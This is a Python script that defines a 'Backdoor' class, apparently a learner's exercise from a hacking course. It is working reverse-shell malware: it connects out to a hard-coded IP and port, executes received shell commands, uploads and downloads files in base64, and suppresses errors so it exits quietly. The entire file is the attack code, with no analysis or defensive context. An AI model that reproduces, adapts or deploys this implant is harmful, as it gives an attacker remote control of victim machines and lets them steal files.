#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def execute_command(self,command):
        DEVNULL = open(os.devnull,'wb')
        return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
    def reliable_send(self,data):
        if type(data) != str:
            json_data = json.dumps(data.decode())
            self.connection.send(json_data.encode('utf-8'))
        else:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode('utf-8'))
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] Changing directory to " + path

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content)) # encode('utf-8')
            return "[+] Upload successful"
#connection.send(b"\n[+] Connection established\n")
#print(received_data)
#subprocess.Popen(received_data,shell=True)
#subprocess.Popen(command,shell=True)
    def run(self):
        while True:
            #command = self.connection.recv(1024).decode() # connection --> is the part where the program runs
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                #self.connection.send(command_result)
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_command(command)
            except Exception:
                command_result = "[-] Error has been raised during command execution."
            #print(command_result)
            self.reliable_send(command_result)
        #print(received_data)
        connection.close()
try:
    myBackdoor = Backdoor("10.0.2.15",4444)
    myBackdoor.run()
except Exception:
    sys.exit()
